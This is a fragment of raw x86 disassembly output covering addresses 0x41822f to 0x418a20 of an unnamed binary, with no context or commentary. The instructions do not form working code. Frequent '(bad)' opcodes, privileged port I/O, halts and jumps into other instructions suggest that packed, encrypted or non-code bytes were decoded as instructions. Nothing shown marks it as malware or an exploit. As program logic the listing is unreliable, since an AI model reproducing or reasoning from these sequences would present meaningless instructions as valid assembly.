  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
